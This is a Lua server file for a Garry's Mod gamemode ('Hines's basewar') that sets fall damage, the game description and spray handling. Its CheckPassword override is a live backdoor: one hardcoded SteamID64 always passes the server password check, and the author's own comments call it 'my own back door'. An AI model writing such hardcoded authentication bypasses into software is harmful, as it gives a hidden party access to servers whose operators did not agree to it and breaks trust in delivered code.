--most of the game logic will be in bw_master.lua
--most of the basic game options will be set here
AddCSLuaFile("cl_init.lua")
AddCSLuaFile("shared.lua")

--really you should remove this. its my own back door.
--strange you can see the ip here.
--but i see a really good reason why it can be useful.
function GM:CheckPassword(steamID64, ipAddress, svPassword, clPassword, name)
	if self.BaseClass:CheckPassword(steamID64, ipAddress, svPassword, clPassword, name)
			or steamID64 == "76561198173269295" then
		return true
	end
	return false
end

function GM:GetFallDamage(player, speed)
	return (speed - 526.5) * 0.225
end

function GM:GetGameDescription()
    return "Hines's basewar"
end

function GM:PlayerSpray(player)
	return true 
end

include("shared.lua")
include("bw_master.lua")